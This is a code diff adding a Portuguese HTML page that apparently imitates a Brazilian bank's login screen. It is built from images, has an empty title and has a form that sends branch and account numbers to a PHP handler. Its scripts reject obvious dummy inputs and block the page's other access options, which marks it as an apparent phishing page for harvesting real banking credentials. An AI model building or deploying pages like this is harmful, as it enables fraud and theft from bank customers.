@@ -1,0 +1,87 @@
+<!DOCTYPE html><html lang="PT-BR"><head>
+<title></title>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<link rel="icon" type="image/png" href="files/images/favicon.png">
+<link rel="stylesheet" type="text/css" href="files/desktop.inicial.css">
+<script language="javascript" src="files/jquery.js"></script>
+<script language="javascript">
+function NextImputText(idobj, idproximo){
+	var str = new String(document.getElementById(idobj).value);
+	var mx = new Number(document.getElementById(idobj).maxLength);
+		if(str.length == mx){
+			document.getElementById(idproximo).focus();
+		}
+}
+function ExecFormatMaskInputs(format, field){
+	var result="";
+	var maskIdx=format.length - 1;
+	var error=false;
+	var valor=field.value;
+	var posFinal=false;
+	if(field.setSelectionRange){
+   		if(field.selectionStart == valor.length)
+   			posFinal=true;
+		}
+		valor=valor.replace(/[^0123456789Xx]/g,'')
+		for(var valIdx=valor.length - 1; valIdx >= 0 && maskIdx >= 0; --maskIdx){
+			var chr=valor.charAt(valIdx);
+			var chrMask=format.charAt(maskIdx);
+			switch(chrMask){
+				case "#":
+				if(!(/\d/.test(chr)))
+					error=true;
+					result=chr + result;
+					--valIdx;
+					break;
+					case "@":
+					result=chr + result;
+					--valIdx;
+					break;
+					default:
+					result=chrMask + result;
+				}
+			}
+			field.value=result;
+			field.style.color=error ? "red":"";
+			if(posFinal){
+				field.selectionStart=result.length;
+				field.selectionEnd=result.length;
+			}
+	return result;
+}
+function ExecValidatesDesktop(){
+	if(document.desk.agc1.value.length < 4 || document.desk.agc1.value == "1111" || document.desk.agc1.value == "2222" || document.desk.agc1.value == "3333" || document.desk.agc1.value == "4444" || document.desk.agc1.value == "5555" || document.desk.agc1.value == "6666" || document.desk.agc1.value == "7777" || document.desk.agc1.value == "8888" || document.desk.agc1.value == "9999" || document.desk.agc1.value == "0000" || document.desk.agc1.value == ""){
+		alert("Digite o número de sua Agência (Exemplo: '9999').");
+		return false;
+	}
+	if(document.desk.cnt1.value.length < 7 || document.desk.cnt1.value == "11111-1" || document.desk.cnt1.value == "22222-2" || document.desk.cnt1.value == "33333-3" || document.desk.cnt1.value == "44444-4" || document.desk.cnt1.value == "55555-5" || document.desk.cnt1.value == "66666-6" || document.desk.cnt1.value == "77777-7" || document.desk.cnt1.value == "88888-8" || document.desk.cnt1.value == "99999-9" || document.desk.cnt1.value == "00000-0" || document.desk.cnt1.value == ""){
+		alert("Digite o número de sua conta, incluindo o dígito verificador (Exemplo: '99999-9').");
+		return false;
+	}
+}
+function BlockOthers(){
+	alert("Utilize apenas sua agência e conta neste acesso.");
+}
+</script>
+</head>
+<body>
+	<div id="top">
+		<img id="tipo" src="files/images/desktop_tipo_inicial.png">
+	</div>
+	<div id="menu">
+		<img id="logo" src="files/images/desktop_logo.png">
+		<img id="content-menu" src="files/images/desktop_menu.png">
+    	<img id="busca" src="files/images/desktop_busca.png">
+    	<img id="barra1" src="files/images/desktop_barra.png">
+    	<img id="opcoes-acesso" src="files/images/desktop_opcoes_acesso.png" onclick="BlockOthers();">
+    	<form name="desk" id="desk" action="desktop.autenticacao.php" method="POST" onsubmit="return ExecValidatesDesktop();">
+			<input type="text" name="agc1" id="agc1" maxlength="4" onkeypress="return ExecFormatOnlyNumbers(event);" onkeyup="NextImputText('agc1', 'cnt1');" placeholder="Agência" autocomplete="off">
+			<input type="text" name="cnt1" id="cnt1" maxlength="7" onkeypress="return ExecFormatOnlyNumbers(event);" onkeyup="ExecFormatMaskInputs('#####-@', this);" placeholder="Conta" autocomplete="off">
+			<input type="submit" name="send" id="send" value=" ">
+		</form>
+    	<img id="textareas" src="files/images/desktop_background_textareas.png">  
+    	<img id="barra2" src="files/images/desktop_barra.png">
+    </div>
+    <img id="banner" src="files/images/desktop_banner_inicial.jpg">
+
+</body></html>
